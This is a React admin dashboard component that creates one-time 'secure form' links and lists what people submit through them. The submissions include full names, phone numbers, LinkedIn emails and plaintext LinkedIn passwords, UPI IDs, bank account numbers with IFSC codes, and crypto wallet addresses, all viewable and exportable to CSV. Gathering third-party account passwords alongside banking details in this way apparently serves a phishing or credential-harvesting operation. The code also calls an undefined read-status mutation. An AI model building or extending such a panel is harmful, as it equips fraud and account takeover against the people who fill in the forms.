import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { Link, useLocation } from "wouter";
import {
  Loader2,
  Search,
  Copy,
  Check,
  Eye,
  EyeOff,
  FileDown,
  RefreshCw,
  Trash2
} from "lucide-react";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";

// Assume a generic apiRequest utility function is available
// It should handle headers and credentials similar to the fetcher in the Admin component
const apiRequest = async (method, url, requestData = null) => {
  const options = {
    method,
    headers: {
      'Content-Type': 'application/json',
    },
    credentials: 'include',
  };
  if (requestData) {
    options.body = JSON.stringify(requestData);
  }
  const response = await fetch(url, options);
  if (!response.ok) {
    const errorBody = await response.json();
    throw new Error(errorBody.message || `API call failed on ${url}`);
  }
  const responseData = await response.json();
  // Handle different response formats
  if (responseData && responseData.data && Array.isArray(responseData.data)) {
    return responseData.data;
  }
  return Array.isArray(responseData) ? responseData : [];
};

export default function SecureFormAdmin() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [searchTerm, setSearchTerm] = useState("");
  const [filter, setFilter] = useState("all");
  const [showPasswords, setShowPasswords] = useState({});
  const [selectedSubmission, setSelectedSubmission] = useState(null);
  const [viewDetailOpen, setViewDetailOpen] = useState(false);
  const [newUrlDialogOpen, setNewUrlDialogOpen] = useState(false);
  const [newUrl, setNewUrl] = useState("");
  const [copySuccess, setCopySuccess] = useState(false);
  const [activeFormId, setActiveFormId] = useState("");

  const [location, setLocation] = useLocation();

  // Fetch all forms
  const { data: allFormsData = [], isLoading: isLoadingForms } = useQuery({
    queryKey: ["all-forms"],
    queryFn: () => apiRequest("GET", "/api/forms"),
  });

  // Ensure allForms is always an array
  const allForms = Array.isArray(allFormsData) ? allFormsData : [];

  // Fetch all secure form submissions by formId
  // Note: This query is enabled only if activeFormId is set.
  // When a new form is created, activeFormId is set, triggering this fetch.
  const { data: submissions = [], isLoading, isFetching, refetch } = useQuery({
    queryKey: ["secure-form-submissions", activeFormId],
    queryFn: () => activeFormId ? apiRequest("GET", `/api/admin/responses/${activeFormId}`) : Promise.resolve([]),
    enabled: !!activeFormId,
  });

  // Create new secure form URL
  const createUrlMutation = useMutation({
    mutationFn: () => apiRequest("POST", "/api/forms/create"),
    onSuccess: (data) => {
      const fullUrl = `${window.location.origin}/secure-form/${data.formId}`;
      setNewUrl(fullUrl);
      setActiveFormId(data.formId);
      setNewUrlDialogOpen(true);
      toast({
        title: "Success",
        description: "Secure form link generated successfully",
      });
      queryClient.invalidateQueries({ queryKey: ["secure-form-submissions", data.formId] });
    },
    onError: (error) => {
      toast({
        title: "Failed to create secure form URL",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  // Read/unread toggling is disabled because backend route has a parameter mismatch.
  // We only display the current read status returned by the API.

  // Copy URL to clipboard
  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(newUrl);
      setCopySuccess(true);
      toast({
        title: "Copied!",
        description: "URL copied to clipboard",
      });
      setTimeout(() => setCopySuccess(false), 2000);
    } catch (error) {
      // Fallback for browsers that don't support clipboard API
      const textArea = document.createElement('textarea');
      textArea.value = newUrl;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      setCopySuccess(true);
      toast({
        title: "Copied!",
        description: "URL copied to clipboard",
      });
      setTimeout(() => setCopySuccess(false), 2000);
    }
  };

  // Export data to CSV
  const exportToCSV = () => {
    if (submissions.length === 0) return;

    const filteredSubmissions = getFilteredSubmissions();

    const headers = [
      "ID",
      "Full Name",
      "Phone",
      "Email",
      "LinkedIn Email",
      "LinkedIn Password",
      "Payment Info (UPI ID)",
      "Payment Info (Bank Account Number)",
      "Payment Info (Bank IFSC Code)",
      "Payment Info (Crypto Wallet Address)",
      "Payment Info (Crypto Network)",
      "Status",
      "Date",
    ];

    const csvData = filteredSubmissions.map((submission) => [
      submission._id,
      submission.fullName,
      submission.phoneNumber,
      submission.email,
      submission.linkedinEmail,
      submission.linkedinPassword,
      submission.paymentInfo?.upiId || "",
      submission.paymentInfo?.bankAccountNumber || "",
      submission.paymentInfo?.bankIfscCode || "",
      submission.paymentInfo?.cryptoWalletAddress || "",
      submission.paymentInfo?.cryptoNetwork || "",
      submission.read ? "Read" : "Unread",
      new Date(submission.createdAt).toLocaleString(),
    ]);

    // Convert to CSV string
    const csvContent = [
      headers.join(","),
      ...csvData.map((row) => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(",")),
    ].join("\n");

    // Create download link
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.setAttribute("href", url);
    link.setAttribute("download", `secure-form-submissions-${new Date().toISOString().split("T")[0]}.csv`);
    link.style.visibility = "hidden";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Toggle password visibility
  const togglePasswordVisibility = (id) => {
    setShowPasswords(prev => ({
      ...prev,
      [id]: !prev[id],
    }));
  };

  // View submission details
  const viewSubmissionDetails = (submission) => {
    if (!submission.read) {
      toggleReadStatusMutation.mutate(submission._id);
    }
    setSelectedSubmission(submission);
    setViewDetailOpen(true);
  };

  // Filter submissions based on selected filter
  const getFilteredSubmissions = () => {
    let filtered = submissions;
    if (filter === "read") {
      filtered = filtered.filter((submission) => submission.read);
    } else if (filter === "unread") {
      filtered = filtered.filter((submission) => !submission.read);
    }

    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(
        (submission) =>
          submission.fullName.toLowerCase().includes(term) ||
          submission.email.toLowerCase().includes(term) ||
          submission.phoneNumber.toLowerCase().includes(term) ||
          submission.linkedinEmail.toLowerCase().includes(term)
      );
    }

    return filtered;
  };

  const filteredSubmissions = getFilteredSubmissions();

  return (
    <div className="p-6 bg-sky-100 min-h-screen">
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-2xl font-bold">Secure Form Submissions</h1>
            <p className="text-gray-500">
              {activeFormId
                ? `Viewing submissions for Form ${activeFormId.slice(0, 8)}...`
                : "Manage all secure form submissions and create new form links"
              }
            </p>
          </div>
          <div className="flex space-x-2">
            <Link href="/admin">
              <Button variant="outline">Back to Admin Dashboard</Button>
            </Link>
            <Button
              onClick={() => createUrlMutation.mutate()}
              disabled={createUrlMutation.isPending}
              className="bg-gradient-to-r from-blue-500 to-blue-700"
            >
              {createUrlMutation.isPending ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Creating...
                </>
              ) : (
                "Generate New Form Link"
              )}
            </Button>
          </div>
        </div>

        <Card className="mb-6">
          <CardHeader className="pb-3">
            <CardTitle>Filters and Options</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex flex-col md:flex-row gap-4">
              <Select value={activeFormId} onValueChange={setActiveFormId} disabled={isLoadingForms}>
                <SelectTrigger className="w-full md:w-[250px]">
                  <SelectValue placeholder={isLoadingForms ? "Loading forms..." : "Select a form to view submissions"} />
                </SelectTrigger>
                <SelectContent>
                  {isLoadingForms ? (
                    <SelectItem value="" disabled>Loading forms...</SelectItem>
                  ) : allForms && allForms.length > 0 ? allForms.map((form) => (
                    <SelectItem key={form._id} value={form.formId}>
                      Form {form.formId.slice(0, 8)}... ({new Date(form.createdAt).toLocaleDateString()})
                    </SelectItem>
                  )) : (
                    <SelectItem value="" disabled>No forms available</SelectItem>
                  )}
                </SelectContent>
              </Select>
              <div className="relative flex-1">
                <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search by name or email..."
                  className="pl-8"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
              </div>
              <Select value={filter} onValueChange={setFilter}>
                <SelectTrigger className="w-full md:w-[180px]">
                  <SelectValue placeholder="Filter by status" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Submissions</SelectItem>
                  <SelectItem value="unread">Unread</SelectItem>
                  <SelectItem value="read">Read</SelectItem>
                </SelectContent>
              </Select>
              <Button
                variant="outline"
                onClick={() => refetch()}
                className="md:w-[120px]"
                disabled={isFetching}
              >
                <RefreshCw className="mr-2 h-4 w-4" />
                Refresh
              </Button>
              <Button
                variant="outline"
                onClick={exportToCSV}
                disabled={filteredSubmissions.length === 0}
                className="md:w-[120px]"
              >
                <FileDown className="mr-2 h-4 w-4" />
                Export
              </Button>
            </div>
          </CardContent>
        </Card>

        {!activeFormId ? (
          <Card>
            <CardContent className="flex flex-col items-center justify-center h-64">
              <p className="text-lg font-medium text-gray-500 mb-2">No form selected</p>
              <p className="text-sm text-gray-400">
                Please select a form from the dropdown above to view its submissions, or generate a new form link.
              </p>
            </CardContent>
          </Card>
        ) : isLoading ? (
          <div className="flex justify-center items-center h-64">
            <Loader2 className="h-8 w-8 animate-spin text-primary" />
          </div>
        ) : filteredSubmissions.length === 0 ? (
          <Card>
            <CardContent className="flex flex-col items-center justify-center h-64">
              <p className="text-lg font-medium text-gray-500 mb-2">No submissions found</p>
              <p className="text-sm text-gray-400">
                {searchTerm || filter !== "all"
                  ? "Try adjusting your filters"
                  : "This form has no submissions yet. Share the form link to start collecting information."}
              </p>
            </CardContent>
          </Card>
        ) : (
          <Card>
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>ID</TableHead>
                      <TableHead>Full Name</TableHead>
                      <TableHead>Phone</TableHead>
                      <TableHead>Email</TableHead>
                      <TableHead>LinkedIn Email</TableHead>
                      <TableHead>Password</TableHead>
                      <TableHead>Payment</TableHead>
                      <TableHead>Status</TableHead>
                      <TableHead>Date</TableHead>
                      <TableHead>Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {filteredSubmissions.map((submission) => (
                      <TableRow
                        key={submission._id}
                        className={!submission.read ? "bg-blue-50" : ""}
                      >
                        <TableCell>{submission._id}</TableCell>
                        <TableCell>{submission.fullName}</TableCell>
                        <TableCell>{submission.phoneNumber}</TableCell>
                        <TableCell>{submission.email}</TableCell>
                        <TableCell>{submission.linkedinEmail}</TableCell>
                        <TableCell>
                          <div className="flex items-center">
                            <span className="mr-2">
                              {showPasswords[submission._id]
                                ? submission.linkedinPassword
                                : "••••••••"}
                            </span>
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={() => togglePasswordVisibility(submission._id)}
                              className="h-6 w-6"
                            >
                              {showPasswords[submission._id] ? (
                                <EyeOff className="h-4 w-4" />
                              ) : (
                                <Eye className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell>
                          {submission.paymentInfo?.upiId ? (
                            <Badge variant="outline">UPI</Badge>
                          ) : submission.paymentInfo?.bankAccountNumber ? (
                            <Badge variant="outline">Bank</Badge>
                          ) : submission.paymentInfo?.cryptoWalletAddress ? (
                            <Badge variant="outline">Crypto</Badge>
                          ) : (
                            <Badge variant="outline">None</Badge>
                          )}
                        </TableCell>
                        <TableCell>
                          <Badge
                            variant={submission.read ? "default" : "secondary"}
                            className={
                              submission.read
                                ? "bg-green-100 text-green-800"
                                : "bg-yellow-100 text-yellow-800"
                            }
                          >
                            {submission.read ? "Read" : "Unread"}
                          </Badge>
                        </TableCell>
                        <TableCell>{new Date(submission.createdAt).toLocaleString()}</TableCell>
                        <TableCell>
                          <div className="flex space-x-1">
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => viewSubmissionDetails(submission)}
                              className="h-8 w-8 p-0"
                            >
                              <Eye className="h-4 w-4" />
                            </Button>
                            {/* Read/unread toggle disabled due to backend constraints */}
                          </div>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
            <CardFooter className="py-4 border-t">
              <div className="text-sm text-gray-500">
                Showing {filteredSubmissions.length} of {submissions.length} submissions
              </div>
            </CardFooter>
          </Card>
        )}
      </div>

      {/* View Submission Details Dialog */}
      <Dialog open={viewDetailOpen} onOpenChange={setViewDetailOpen}>
        <DialogContent className="max-w-3xl">
          <DialogHeader>
            <DialogTitle>Submission Details</DialogTitle>
            <DialogDescription>
              Complete information for submission #{selectedSubmission?._id}
            </DialogDescription>
          </DialogHeader>

          {selectedSubmission && (
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Full Name</h3>
                  <p className="mt-1">{selectedSubmission.fullName}</p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Phone</h3>
                  <p className="mt-1">{selectedSubmission.phoneNumber}</p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Email</h3>
                  <p className="mt-1">{selectedSubmission.email}</p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Date Submitted</h3>
                  <p className="mt-1">{new Date(selectedSubmission.createdAt).toLocaleString()}</p>
                </div>
              </div>

              <div className="border-t pt-4">
                <h3 className="text-lg font-medium mb-3">LinkedIn Credentials</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">LinkedIn Email</h3>
                    <p className="mt-1">{selectedSubmission.linkedinEmail}</p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">LinkedIn Password</h3>
                    <div className="flex items-center mt-1">
                      <p>
                        {showPasswords[selectedSubmission._id]
                          ? selectedSubmission.linkedinPassword
                          : "••••••••"}
                      </p>
                      <Button
                        variant="ghost"
                        size="icon"
                        onClick={() => togglePasswordVisibility(selectedSubmission._id)}
                        className="h-6 w-6 ml-2"
                      >
                        {showPasswords[selectedSubmission._id] ? (
                          <EyeOff className="h-4 w-4" />
                        ) : (
                          <Eye className="h-4 w-4" />
                        )}
                      </Button>
                    </div>
                  </div>
                </div>
              </div>

              <div className="border-t pt-4">
                <h3 className="text-lg font-medium mb-3">Payment Information</h3>

                {selectedSubmission.paymentInfo ? (
                  <div className="space-y-4">
                    {selectedSubmission.paymentInfo.upiId && (
                      <div className="border p-3 rounded-md">
                        <h4 className="font-medium">UPI Payment</h4>
                        <p className="text-sm mt-1">
                          <span className="text-gray-500">UPI ID:</span>{" "}
                          {selectedSubmission.paymentInfo.upiId}
                        </p>
                      </div>
                    )}
                    {selectedSubmission.paymentInfo.bankAccountNumber && (
                      <div className="border p-3 rounded-md">
                        <h4 className="font-medium">Bank Account</h4>
                        <p className="text-sm mt-1">
                          <span className="text-gray-500">Account Number:</span>{" "}
                          {selectedSubmission.paymentInfo.bankAccountNumber}
                        </p>
                        {selectedSubmission.paymentInfo.bankIfscCode && (
                          <p className="text-sm mt-1">
                            <span className="text-gray-500">IFSC Code:</span>{" "}
                            {selectedSubmission.paymentInfo.bankIfscCode}
                          </p>
                        )}
                      </div>
                    )}
                    {selectedSubmission.paymentInfo.cryptoWalletAddress && (
                      <div className="border p-3 rounded-md">
                        <h4 className="font-medium">Crypto Wallet</h4>
                        <p className="text-sm mt-1">
                          <span className="text-gray-500">Wallet Address:</span>{" "}
                          {selectedSubmission.paymentInfo.cryptoWalletAddress}
                        </p>
                        {selectedSubmission.paymentInfo.cryptoNetwork && (
                          <p className="text-sm mt-1">
                            <span className="text-gray-500">Network:</span>{" "}
                            {selectedSubmission.paymentInfo.cryptoNetwork}
                          </p>
                        )}
                      </div>
                    )}
                    {!selectedSubmission.paymentInfo.upiId && !selectedSubmission.paymentInfo.bankAccountNumber && !selectedSubmission.paymentInfo.cryptoWalletAddress && (
                      <p className="text-gray-500">No payment information provided</p>
                    )}
                  </div>
                ) : (
                  <p className="text-gray-500">No payment information provided</p>
                )}
              </div>
            </div>
          )}

          <DialogFooter className="flex justify-between items-center">
            <div className="flex items-center">
              <Badge
                variant={selectedSubmission?.read ? "default" : "secondary"}
                className={
                  selectedSubmission?.read
                    ? "bg-green-100 text-green-800"
                    : "bg-yellow-100 text-yellow-800"
                }
              >
                {selectedSubmission?.read ? "Read" : "Unread"}
              </Badge>
            </div>
            <div className="space-x-2">
              <Button variant="outline" onClick={() => setViewDetailOpen(false)}>
                Close
              </Button>
            </div>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* New URL Dialog */}
      <Dialog open={newUrlDialogOpen} onOpenChange={(open) => {
        setNewUrlDialogOpen(open);
        if (!open) {
          setCopySuccess(false);
        }
      }}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Secure Form Link Generated</DialogTitle>
            <DialogDescription>
              Share this unique URL with the user to access the secure form
            </DialogDescription>
          </DialogHeader>
          <div className="flex items-center space-x-2">
            <Input value={newUrl} readOnly className="flex-1" />
            <Button size="icon" onClick={copyToClipboard}>
              {copySuccess ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
            </Button>
          </div>
          <p className="text-sm text-amber-600 mt-2">
            <strong>Important:</strong> This URL can only be used once. Save it before
            closing this dialog.
          </p>
          <DialogFooter className="flex gap-2">
            <Button variant="outline" onClick={() => window.open(newUrl, '_blank')}>Open Link</Button>
            <Button onClick={() => setNewUrlDialogOpen(false)}>Close</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}